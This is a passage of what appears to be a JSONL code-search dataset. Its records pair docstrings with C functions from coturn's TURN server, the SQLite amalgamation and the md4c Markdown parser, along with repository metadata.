SSL_ERROR_ZERO_RETURN:\n\t\t\t\t\t/* Try again */\n\t\t\t\t\tbreak;\n\t\t\t\tcase SSL_ERROR_SYSCALL:\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO,\"Socket write error 111.666: \\n\");\n\t\t\t\t\tif (handle_socket_error())\n\t\t\t\t\t\tbreak;\n\t\t\t\tcase SSL_ERROR_SSL:\n\t\t\t\t{\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO, \"SSL write error: \\n\");\n\t\t\t\t\tchar buf[1024];\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO,\n\t\t\t\t\t\t\"%s (%d)\\n\",\n\t\t\t\t\t\tERR_error_string(ERR_get_error(),buf),\n\t\t\t\t\t\tSSL_get_error(ssl, len));\n\t\t\t\t}\n\t\t\t\tdefault:\n\t\t\t\t\tclnet_info->broken = 1;\n\t\t\t\t\tTURN_LOG_FUNC(TURN_LOG_LEVEL_INFO,\"Unexpected error while writing!\\n\");\n\t\t\t\t\treturn -1;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t} else if (fd >= 0) {\n\n\t\tsize_t left = (size_t) (message->len);\n\n\t\twhile (left > 0) {\n\t\t\tdo {\n\t\t\t\trc = send(fd, buffer, left, 0);\n\t\t\t} while (rc < 0 && ((errno == EINTR) || (errno == ENOBUFS)));\n\t\t\tif (rc > 0) {\n\t\t\t\tleft -= (size_t) rc;\n\t\t\t\tbuffer += rc;\n\t\t\t} else {\n\t\t\t\ttot_send_dropped+=1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tif (left > 0)\n\t\t\treturn -1;\n\n\t\tret = (int) message->len;\n\t}\n\n\treturn ret;\n}", "path": "src\\apps\\uclient\\uclient.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/* Only must be called for DTLS_SOCKET */\n", "func_signal": "ioa_socket_handle create_ioa_socket_from_ssl(ioa_engine_handle e, ioa_socket_handle parent_s, SSL* ssl, SOCKET_TYPE st, SOCKET_APP_TYPE sat, const ioa_addr *remote_addr, const ioa_addr *local_addr)", "code": "{\n\tif(!parent_s)\n\t\treturn NULL;\n\n\tioa_socket_handle ret = create_ioa_socket_from_fd(e, parent_s->fd, parent_s, st, sat, remote_addr, local_addr);\n\n\tif(ret) {\n\t\tset_socket_ssl(ret,ssl);\n\t\tif(st == DTLS_SOCKET)\n\t\t\tSTRCPY(ret->orig_ctx_type,\"DTLSv1.0\");\n\t}\n\n\treturn ret;\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/* <<== RFC 6062 */\n", "func_signal": "void add_socket_to_parent(ioa_socket_handle parent_s, ioa_socket_handle s)", "code": "{\n\tif(parent_s && s) {\n\t\tdelete_socket_from_parent(s);\n\t\ts->parent_s = parent_s;\n\t\ts->fd = parent_s->fd;\n\t}\n}", "path": "src\\apps\\relay\\ns_ioalib_engine_impl.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "///////////////////////////////////////////////////////////////////////////////\n", "func_signal": "static void __turn_getMSTime(void)", "code": "{\n  static u64bits start_sec = 0;\n  struct timespec tp={0,0};\n#if defined(CLOCK_REALTIME)\n  clock_gettime(CLOCK_REALTIME, &tp);\n#else\n  tp.tv_sec = time(NULL);\n#endif\n  if(!start_sec)\n    start_sec = tp.tv_sec;\n  if(current_time != (u64bits)((u64bits)(tp.tv_sec)-start_sec))\n    show_statistics = 1;\n  current_time = (u64bits)((u64bits)(tp.tv_sec)-start_sec);\n  current_mstime = (u64bits)((current_time * 1000) + (tp.tv_nsec/1000000));\n}", "path": "src\\apps\\uclient\\uclient.c", "repo_name": "coturn/rfc5766-turn-server", "stars": 503, "license": "other", "language": "c", "size": 3077}
{"docstring": "/*\n** Lock an memdb-file.\n*/\n", "func_signal": "static int memdbLock(sqlite3_file *pFile, int eLock)", "code": "{\n  MemFile *p = (MemFile *)pFile;\n  if( eLock>SQLITE_LOCK_SHARED \n   && (p->mFlags & SQLITE_DESERIALIZE_READONLY)!=0\n  ){\n    return SQLITE_READONLY;\n  }\n  p->eLock = eLock;\n  return SQLITE_OK;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** This routine is the only routine in this file with external linkage.\n**\n** Populate the low-level memory allocation function pointers in\n** sqlite3GlobalConfig.m with pointers to the routines in this file.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3MemSetDefault(void)", "code": "{\n  static const sqlite3_mem_methods defaultMethods = {\n     sqlite3MemMalloc,\n     sqlite3MemFree,\n     sqlite3MemRealloc,\n     sqlite3MemSize,\n     sqlite3MemRoundup,\n     sqlite3MemInit,\n     sqlite3MemShutdown,\n     0\n  };\n  sqlite3_config(SQLITE_CONFIG_MALLOC, &defaultMethods);\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** The xRollbackTo() method.\n**\n** Discard the contents of the pending terms table.\n*/\n", "func_signal": "static int fts3RollbackToMethod(sqlite3_vtab *pVtab, int iSavepoint)", "code": "{\n  Fts3Table *p = (Fts3Table*)pVtab;\n  UNUSED_PARAMETER(iSavepoint);\n  assert( p->inTransaction );\n  TESTONLY( p->mxSavepoint = iSavepoint );\n  sqlite3Fts3PendingTermsClear(p);\n  return SQLITE_OK;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Indicate that the accumulator load should be skipped on this\n** iteration of the aggregate loop.\n*/\n", "func_signal": "static void sqlite3SkipAccumulatorLoad(sqlite3_context *context)", "code": "{\n  assert( context->isError<=0 );\n  context->isError = -1;\n  context->skipFlag = 1;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** The RenameCtx contains a list of tokens that reference a column that\n** is being renamed by an ALTER TABLE statement.  Return the \"last\"\n** RenameToken in the RenameCtx and remove that RenameToken from the\n** RenameContext.  \"Last\" means the last RenameToken encountered when\n** the input SQL is parsed from left to right.  Repeated calls to this routine\n** return all column name tokens in the order that they are encountered\n** in the SQL statement.\n*/\n", "func_signal": "static RenameToken *renameColumnTokenNext(RenameCtx *pCtx)", "code": "{\n  RenameToken *pBest = pCtx->pList;\n  RenameToken *pToken;\n  RenameToken **pp;\n\n  for(pToken=pBest->pNext; pToken; pToken=pToken->pNext){\n    if( pToken->t.z>pBest->t.z ) pBest = pToken;\n  }\n  for(pp=&pCtx->pList; *pp!=pBest; pp=&(*pp)->pNext);\n  *pp = pBest->pNext;\n\n  return pBest;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Return the length of the data corresponding to the supplied serial-type.\n*/\n", "func_signal": "SQLITE_PRIVATE u32 sqlite3VdbeSerialTypeLen(u32 serial_type)", "code": "{\n  if( serial_type>=128 ){\n    return (serial_type-12)/2;\n  }else{\n    assert( serial_type<12 \n            || sqlite3SmallTypeSizes[serial_type]==(serial_type - 12)/2 );\n    return sqlite3SmallTypeSizes[serial_type];\n  }\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Retrieve a pointer to a static mutex or allocate a new dynamic one.\n*/\n", "func_signal": "SQLITE_API sqlite3_mutex *sqlite3_mutex_alloc(int id)", "code": "{\n#ifndef SQLITE_OMIT_AUTOINIT\n  if( id<=SQLITE_MUTEX_RECURSIVE && sqlite3_initialize() ) return 0;\n  if( id>SQLITE_MUTEX_RECURSIVE && sqlite3MutexInit() ) return 0;\n#endif\n  assert( sqlite3GlobalConfig.mutex.xMutexAlloc );\n  return sqlite3GlobalConfig.mutex.xMutexAlloc(id);\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Remove a trigger from the hash tables of the sqlite* pointer.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3UnlinkAndDeleteTrigger(sqlite3 *db, int iDb, const char *zName)", "code": "{\n  Trigger *pTrigger;\n  Hash *pHash;\n\n  assert( sqlite3SchemaMutexHeld(db, iDb, 0) );\n  pHash = &(db->aDb[iDb].pSchema->trigHash);\n  pTrigger = sqlite3HashInsert(pHash, zName, 0);\n  if( ALWAYS(pTrigger) ){\n    if( pTrigger->pSchema==pTrigger->pTabSchema ){\n      Table *pTab = tableOfTrigger(pTrigger);\n      Trigger **pp;\n      for(pp=&pTab->pTrigger; *pp!=pTrigger; pp=&((*pp)->pNext));\n      *pp = (*pp)->pNext;\n    }\n    sqlite3DeleteTrigger(db, pTrigger);\n    db->mDbFlags |= DBFLAG_SchemaChange;\n  }\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/* destructor for json_each virtual table */\n", "func_signal": "static int jsonEachDisconnect(sqlite3_vtab *pVtab)", "code": "{\n  sqlite3_free(pVtab);\n  return SQLITE_OK;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Return true if the floating point value is Not a Number (NaN).\n**\n** Use the math library isnan() function if compiled with SQLITE_HAVE_ISNAN.\n** Otherwise, we have our own implementation that works on most systems.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3IsNaN(double x)", "code": "{\n  int rc;   /* The value return */\n#if !SQLITE_HAVE_ISNAN && !HAVE_ISNAN\n  /*\n  ** Systems that support the isnan() library function should probably\n  ** make use of it by compiling with -DSQLITE_HAVE_ISNAN.  But we have\n  ** found that many systems do not have a working isnan() function so\n  ** this implementation is provided as an alternative.\n  **\n  ** This NaN test sometimes fails if compiled on GCC with -ffast-math.\n  ** On the other hand, the use of -ffast-math comes with the following\n  ** warning:\n  **\n  **      This option [-ffast-math] should never be turned on by any\n  **      -O option since it can result in incorrect output for programs\n  **      which depend on an exact implementation of IEEE or ISO \n  **      rules/specifications for math functions.\n  **\n  ** Under MSVC, this NaN test may fail if compiled with a floating-\n  ** point precision mode other than /fp:precise.  From the MSDN \n  ** documentation:\n  **\n  **      The compiler [with /fp:precise] will properly handle comparisons \n  **      involving NaN. For example, x != x evaluates to true if x is NaN \n  **      ...\n  */\n#ifdef __FAST_MATH__\n# error SQLite will not work correctly with the -ffast-math option of GCC.\n#endif\n  volatile double y = x;\n  volatile double z = y;\n  rc = (y!=z);\n#else  /* if HAVE_ISNAN */\n  rc = isnan(x);\n#endif /* HAVE_ISNAN */\n  testcase( rc );\n  return rc;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Return non-zero if a transaction is active.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeIsInTrans(Btree *p)", "code": "{\n  assert( p==0 || sqlite3_mutex_held(p->db->mutex) );\n  return (p && (p->inTrans==TRANS_WRITE));\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** This function is invoked by the parser to call the xConnect() method\n** of the virtual table pTab. If an error occurs, an error code is returned \n** and an error left in pParse.\n**\n** This call is a no-op if table pTab is not a virtual table.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3VtabCallConnect(Parse *pParse, Table *pTab)", "code": "{\n  sqlite3 *db = pParse->db;\n  const char *zMod;\n  Module *pMod;\n  int rc;\n\n  assert( pTab );\n  if( !IsVirtual(pTab) || sqlite3GetVTable(db, pTab) ){\n    return SQLITE_OK;\n  }\n\n  /* Locate the required virtual table module */\n  zMod = pTab->azModuleArg[0];\n  pMod = (Module*)sqlite3HashFind(&db->aModule, zMod);\n\n  if( !pMod ){\n    const char *zModule = pTab->azModuleArg[0];\n    sqlite3ErrorMsg(pParse, \"no such module: %s\", zModule);\n    rc = SQLITE_ERROR;\n  }else{\n    char *zErr = 0;\n    rc = vtabCallConstructor(db, pTab, pMod, pMod->pModule->xConnect, &zErr);\n    if( rc!=SQLITE_OK ){\n      sqlite3ErrorMsg(pParse, \"%s\", zErr);\n      pParse->rc = rc;\n    }\n    sqlite3DbFree(db, zErr);\n  }\n\n  return rc;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Table *p is a virtual table. This function removes the VTable object\n** for table *p associated with database connection db from the linked\n** list in p->pVTab. It also decrements the VTable ref count. This is\n** used when closing database connection db to free all of its VTable\n** objects without disturbing the rest of the Schema object (which may\n** be being used by other shared-cache connections).\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VtabDisconnect(sqlite3 *db, Table *p)", "code": "{\n  VTable **ppVTab;\n\n  assert( IsVirtual(p) );\n  assert( sqlite3BtreeHoldsAllMutexes(db) );\n  assert( sqlite3_mutex_held(db->mutex) );\n\n  for(ppVTab=&p->pVTable; *ppVTab; ppVTab=&(*ppVTab)->pNext){\n    if( (*ppVTab)->db==db  ){\n      VTable *pVTab = *ppVTab;\n      *ppVTab = pVTab->pNext;\n      sqlite3VtabUnlock(pVTab);\n      break;\n    }\n  }\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Push an authorization context.  After this routine is called, the\n** zArg3 argument to authorization callbacks will be zContext until\n** popped.  Or if pParse==0, this routine is a no-op.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3AuthContextPush(\n  Parse *pParse,\n  AuthContext *pContext, \n  const char *zContext\n)", "code": "{\n  assert( pParse );\n  pContext->pParse = pParse;\n  pContext->zAuthContext = pParse->zAuthContext;\n  pParse->zAuthContext = zContext;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Return the opcode for a given address.  If the address is -1, then\n** return the most recently inserted opcode.\n**\n** If a memory allocation error has occurred prior to the calling of this\n** routine, then a pointer to a dummy VdbeOp will be returned.  That opcode\n** is readable but not writable, though it is cast to a writable value.\n** The return of a dummy opcode allows the call to continue functioning\n** after an OOM fault without having to check to see if the return from \n** this routine is a valid pointer.  But because the dummy.opcode is 0,\n** dummy will never be written to.  This is verified by code inspection and\n** by running with Valgrind.\n*/\n", "func_signal": "SQLITE_PRIVATE VdbeOp *sqlite3VdbeGetOp(Vdbe *p, int addr)", "code": "{\n  /* C89 specifies that the constant \"dummy\" will be initialized to all\n  ** zeros, which is correct.  MSVC generates a warning, nevertheless. */\n  static VdbeOp dummy;  /* Ignore the MSVC warning about no initializer */\n  assert( p->magic==VDBE_MAGIC_INIT );\n  if( addr<0 ){\n    addr = p->nOp - 1;\n  }\n  assert( (addr>=0 && addr<p->nOp) || p->db->mallocFailed );\n  if( p->db->mallocFailed ){\n    return (VdbeOp*)&dummy;\n  }else{\n    return &p->aOp[addr];\n  }\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Write value iVal encoded as a varint to the PMA. Return \n** SQLITE_OK if successful, or an SQLite error code if an error occurs.\n*/\n", "func_signal": "static void vdbePmaWriteVarint(PmaWriter *p, u64 iVal)", "code": "{\n  int nByte; \n  u8 aByte[10];\n  nByte = sqlite3PutVarint(aByte, iVal);\n  vdbePmaWriteBlob(p, aByte, nByte);\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** If they are not already populated, populate the pIter->azTblCol[],\n** pIter->abTblPk[], pIter->nTblCol and pIter->bRowid variables according to\n** the table (not index) that the iterator currently points to.\n**\n** Return SQLITE_OK if successful, or an SQLite error code otherwise. If\n** an error does occur, an error code and error message are also left in \n** the RBU handle.\n*/\n", "func_signal": "static int rbuObjIterCacheTableInfo(sqlite3rbu *p, RbuObjIter *pIter)", "code": "{\n  if( pIter->azTblCol==0 ){\n    sqlite3_stmt *pStmt = 0;\n    int nCol = 0;\n    int i;                        /* for() loop iterator variable */\n    int bRbuRowid = 0;            /* If input table has column \"rbu_rowid\" */\n    int iOrder = 0;\n    int iTnum = 0;\n\n    /* Figure out the type of table this step will deal with. */\n    assert( pIter->eType==0 );\n    rbuTableType(p, pIter->zTbl, &pIter->eType, &iTnum, &pIter->iPkTnum);\n    if( p->rc==SQLITE_OK && pIter->eType==RBU_PK_NOTABLE ){\n      p->rc = SQLITE_ERROR;\n      p->zErrmsg = sqlite3_mprintf(\"no such table: %s\", pIter->zTbl);\n    }\n    if( p->rc ) return p->rc;\n    if( pIter->zIdx==0 ) pIter->iTnum = iTnum;\n\n    assert( pIter->eType==RBU_PK_NONE || pIter->eType==RBU_PK_IPK \n         || pIter->eType==RBU_PK_EXTERNAL || pIter->eType==RBU_PK_WITHOUT_ROWID\n         || pIter->eType==RBU_PK_VTAB\n    );\n\n    /* Populate the azTblCol[] and nTblCol variables based on the columns\n    ** of the input table. Ignore any input table columns that begin with\n    ** \"rbu_\".  */\n    p->rc = prepareFreeAndCollectError(p->dbRbu, &pStmt, &p->zErrmsg, \n        sqlite3_mprintf(\"SELECT * FROM '%q'\", pIter->zDataTbl)\n    );\n    if( p->rc==SQLITE_OK ){\n      nCol = sqlite3_column_count(pStmt);\n      rbuAllocateIterArrays(p, pIter, nCol);\n    }\n    for(i=0; p->rc==SQLITE_OK && i<nCol; i++){\n      const char *zName = (const char*)sqlite3_column_name(pStmt, i);\n      if( sqlite3_strnicmp(\"rbu_\", zName, 4) ){\n        char *zCopy = rbuStrndup(zName, &p->rc);\n        pIter->aiSrcOrder[pIter->nTblCol] = pIter->nTblCol;\n        pIter->azTblCol[pIter->nTblCol++] = zCopy;\n      }\n      else if( 0==sqlite3_stricmp(\"rbu_rowid\", zName) ){\n        bRbuRowid = 1;\n      }\n    }\n    sqlite3_finalize(pStmt);\n    pStmt = 0;\n\n    if( p->rc==SQLITE_OK\n     && rbuIsVacuum(p)==0\n     && bRbuRowid!=(pIter->eType==RBU_PK_VTAB || pIter->eType==RBU_PK_NONE)\n    ){\n      p->rc = SQLITE_ERROR;\n      p->zErrmsg = sqlite3_mprintf(\n          \"table %q %s rbu_rowid column\", pIter->zDataTbl,\n          (bRbuRowid ? \"may not have\" : \"requires\")\n      );\n    }\n\n    /* Check that all non-HIDDEN columns in the destination table are also\n    ** present in the input table. Populate the abTblPk[], azTblType[] and\n    ** aiTblOrder[] arrays at the same time.  */\n    if( p->rc==SQLITE_OK ){\n      p->rc = prepareFreeAndCollectError(p->dbMain, &pStmt, &p->zErrmsg, \n          sqlite3_mprintf(\"PRAGMA table_info(%Q)\", pIter->zTbl)\n      );\n    }\n    while( p->rc==SQLITE_OK && SQLITE_ROW==sqlite3_step(pStmt) ){\n      const char *zName = (const char*)sqlite3_column_text(pStmt, 1);\n      if( zName==0 ) break;  /* An OOM - finalize() below returns S_NOMEM */\n      for(i=iOrder; i<pIter->nTblCol; i++){\n        if( 0==strcmp(zName, pIter->azTblCol[i]) ) break;\n      }\n      if( i==pIter->nTblCol ){\n        p->rc = SQLITE_ERROR;\n        p->zErrmsg = sqlite3_mprintf(\"column missing from %q: %s\",\n            pIter->zDataTbl, zName\n        );\n      }else{\n        int iPk = sqlite3_column_int(pStmt, 5);\n        int bNotNull = sqlite3_column_int(pStmt, 3);\n        const char *zType = (const char*)sqlite3_column_text(pStmt, 2);\n\n        if( i!=iOrder ){\n          SWAP(int, pIter->aiSrcOrder[i], pIter->aiSrcOrder[iOrder]);\n          SWAP(char*, pIter->azTblCol[i], pIter->azTblCol[iOrder]);\n        }\n\n        pIter->azTblType[iOrder] = rbuStrndup(zType, &p->rc);\n        pIter->abTblPk[iOrder] = (iPk!=0);\n        pIter->abNotNull[iOrder] = (u8)bNotNull || (iPk!=0);\n        iOrder++;\n      }\n    }\n\n    rbuFinalize(p, pStmt);\n    rbuObjIterCacheIndexedCols(p, pIter);\n    assert( pIter->eType!=RBU_PK_VTAB || pIter->abIndexed==0 );\n    assert( pIter->eType!=RBU_PK_VTAB || pIter->nIndex==0 );\n  }\n\n  return p->rc;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Return the sector-size in bytes for an rbuVfs-file.\n*/\n", "func_signal": "static int rbuVfsSectorSize(sqlite3_file *pFile)", "code": "{\n  rbu_file *p = (rbu_file *)pFile;\n  return p->pReal->pMethods->xSectorSize(p->pReal);\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Implementation of the R*-tree variant of SplitNode from Beckman[1990].\n*/\n", "func_signal": "static int splitNodeStartree(\n  Rtree *pRtree,\n  RtreeCell *aCell,\n  int nCell,\n  RtreeNode *pLeft,\n  RtreeNode *pRight,\n  RtreeCell *pBboxLeft,\n  RtreeCell *pBboxRight\n)", "code": "{\n  int **aaSorted;\n  int *aSpare;\n  int ii;\n\n  int iBestDim = 0;\n  int iBestSplit = 0;\n  RtreeDValue fBestMargin = RTREE_ZERO;\n\n  sqlite3_int64 nByte = (pRtree->nDim+1)*(sizeof(int*)+nCell*sizeof(int));\n\n  aaSorted = (int **)sqlite3_malloc64(nByte);\n  if( !aaSorted ){\n    return SQLITE_NOMEM;\n  }\n\n  aSpare = &((int *)&aaSorted[pRtree->nDim])[pRtree->nDim*nCell];\n  memset(aaSorted, 0, nByte);\n  for(ii=0; ii<pRtree->nDim; ii++){\n    int jj;\n    aaSorted[ii] = &((int *)&aaSorted[pRtree->nDim])[ii*nCell];\n    for(jj=0; jj<nCell; jj++){\n      aaSorted[ii][jj] = jj;\n    }\n    SortByDimension(pRtree, aaSorted[ii], nCell, ii, aCell, aSpare);\n  }\n\n  for(ii=0; ii<pRtree->nDim; ii++){\n    RtreeDValue margin = RTREE_ZERO;\n    RtreeDValue fBestOverlap = RTREE_ZERO;\n    RtreeDValue fBestArea = RTREE_ZERO;\n    int iBestLeft = 0;\n    int nLeft;\n\n    for(\n      nLeft=RTREE_MINCELLS(pRtree); \n      nLeft<=(nCell-RTREE_MINCELLS(pRtree)); \n      nLeft++\n    ){\n      RtreeCell left;\n      RtreeCell right;\n      int kk;\n      RtreeDValue overlap;\n      RtreeDValue area;\n\n      memcpy(&left, &aCell[aaSorted[ii][0]], sizeof(RtreeCell));\n      memcpy(&right, &aCell[aaSorted[ii][nCell-1]], sizeof(RtreeCell));\n      for(kk=1; kk<(nCell-1); kk++){\n        if( kk<nLeft ){\n          cellUnion(pRtree, &left, &aCell[aaSorted[ii][kk]]);\n        }else{\n          cellUnion(pRtree, &right, &aCell[aaSorted[ii][kk]]);\n        }\n      }\n      margin += cellMargin(pRtree, &left);\n      margin += cellMargin(pRtree, &right);\n      overlap = cellOverlap(pRtree, &left, &right, 1);\n      area = cellArea(pRtree, &left) + cellArea(pRtree, &right);\n      if( (nLeft==RTREE_MINCELLS(pRtree))\n       || (overlap<fBestOverlap)\n       || (overlap==fBestOverlap && area<fBestArea)\n      ){\n        iBestLeft = nLeft;\n        fBestOverlap = overlap;\n        fBestArea = area;\n      }\n    }\n\n    if( ii==0 || margin<fBestMargin ){\n      iBestDim = ii;\n      fBestMargin = margin;\n      iBestSplit = iBestLeft;\n    }\n  }\n\n  memcpy(pBboxLeft, &aCell[aaSorted[iBestDim][0]], sizeof(RtreeCell));\n  memcpy(pBboxRight, &aCell[aaSorted[iBestDim][iBestSplit]], sizeof(RtreeCell));\n  for(ii=0; ii<nCell; ii++){\n    RtreeNode *pTarget = (ii<iBestSplit)?pLeft:pRight;\n    RtreeCell *pBbox = (ii<iBestSplit)?pBboxLeft:pBboxRight;\n    RtreeCell *pCell = &aCell[aaSorted[iBestDim][ii]];\n    nodeInsertCell(pRtree, pTarget, pCell);\n    cellUnion(pRtree, pBbox, pCell);\n  }\n\n  sqlite3_free(aaSorted);\n  return SQLITE_OK;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/*\n** Initialize the first page of the database file (creating a database\n** consisting of a single page and no schema objects). Return SQLITE_OK\n** if successful, or an SQLite error code otherwise.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeNewDb(Btree *p)", "code": "{\n  int rc;\n  sqlite3BtreeEnter(p);\n  p->pBt->nPage = 0;\n  rc = newDatabase(p->pBt);\n  sqlite3BtreeLeave(p);\n  return rc;\n}", "path": "sqlite3\\sqlite3.c", "repo_name": "bvinc/go-sqlite-lite", "stars": 328, "license": "bsd-3-clause", "language": "c", "size": 7968}
{"docstring": "/********************\n ***  Public API  ***\n ********************/\n", "func_signal": "int\nmd_parse(const MD_CHAR* text, MD_SIZE size, const MD_PARSER* parser, void* userdata)", "code": "{\n    MD_CTX ctx;\n    int i;\n    int ret;\n\n    if(parser->abi_version != 0) {\n        if(parser->debug_log != NULL)\n            parser->debug_log(\"Unsupported abi_version.\", userdata);\n        return -1;\n    }\n\n    /* Setup context structure. */\n    memset(&ctx, 0, sizeof(MD_CTX));\n    ctx.text = text;\n    ctx.size = size;\n    memcpy(&ctx.parser, parser, sizeof(MD_PARSER));\n    ctx.userdata = userdata;\n    ctx.code_indent_offset = (ctx.parser.flags & MD_FLAG_NOINDENTEDCODEBLOCKS) ? (OFF)(-1) : 4;\n    md_build_mark_char_map(&ctx);\n    ctx.doc_ends_with_newline = (size > 0  &&  ISNEWLINE_(text[size-1]));\n\n    /* Reset all unresolved opener mark chains. */\n    for(i = 0; i < (int) SIZEOF_ARRAY(ctx.mark_chains); i++) {\n        ctx.mark_chains[i].head = -1;\n        ctx.mark_chains[i].tail = -1;\n    }\n    ctx.unresolved_link_head = -1;\n    ctx.unresolved_link_tail = -1;\n\n    /* All the work. */\n    ret = md_process_doc(&ctx);\n\n    /* Clean-up. */\n    md_free_ref_defs(&ctx);\n    md_free_ref_def_hashtable(&ctx);\n    free(ctx.buffer);\n    free(ctx.marks);\n    free(ctx.block_bytes);\n    free(ctx.containers);\n\n    return ret;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/***********************\n ***  Line Analysis  ***\n ***********************/\n", "func_signal": "static int\nmd_is_hr_line(MD_CTX* ctx, OFF beg, OFF* p_end, OFF* p_killer)", "code": "{\n    OFF off = beg + 1;\n    int n = 1;\n\n    while(off < ctx->size  &&  (CH(off) == CH(beg) || CH(off) == _T(' ') || CH(off) == _T('\\t'))) {\n        if(CH(off) == CH(beg))\n            n++;\n        off++;\n    }\n\n    if(n < 3) {\n        *p_killer = off;\n        return FALSE;\n    }\n\n    /* Nothing else can be present on the line. */\n    if(off < ctx->size  &&  !ISNEWLINE(off)) {\n        *p_killer = off;\n        return FALSE;\n    }\n\n    *p_end = off;\n    return TRUE;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Returns type of the raw HTML block, or FALSE if it is not HTML block.\n * (Refer to CommonMark specification for details about the types.)\n */\n", "func_signal": "static int\nmd_is_html_block_start_condition(MD_CTX* ctx, OFF beg)", "code": "{\n    typedef struct TAG_tag TAG;\n    struct TAG_tag {\n        const CHAR* name;\n        unsigned len    : 8;\n    };\n\n    /* Type 6 is started by a long list of allowed tags. We use two-level\n     * tree to speed-up the search. */\n#ifdef X\n    #undef X\n#endif\n#define X(name)     { _T(name), (sizeof(name)-1) / sizeof(CHAR) }\n#define Xend        { NULL, 0 }\n    static const TAG t1[] = { X(\"script\"), X(\"pre\"), X(\"style\"), Xend };\n\n    static const TAG a6[] = { X(\"address\"), X(\"article\"), X(\"aside\"), Xend };\n    static const TAG b6[] = { X(\"base\"), X(\"basefont\"), X(\"blockquote\"), X(\"body\"), Xend };\n    static const TAG c6[] = { X(\"caption\"), X(\"center\"), X(\"col\"), X(\"colgroup\"), Xend };\n    static const TAG d6[] = { X(\"dd\"), X(\"details\"), X(\"dialog\"), X(\"dir\"),\n                              X(\"div\"), X(\"dl\"), X(\"dt\"), Xend };\n    static const TAG f6[] = { X(\"fieldset\"), X(\"figcaption\"), X(\"figure\"), X(\"footer\"),\n                              X(\"form\"), X(\"frame\"), X(\"frameset\"), Xend };\n    static const TAG h6[] = { X(\"h1\"), X(\"head\"), X(\"header\"), X(\"hr\"), 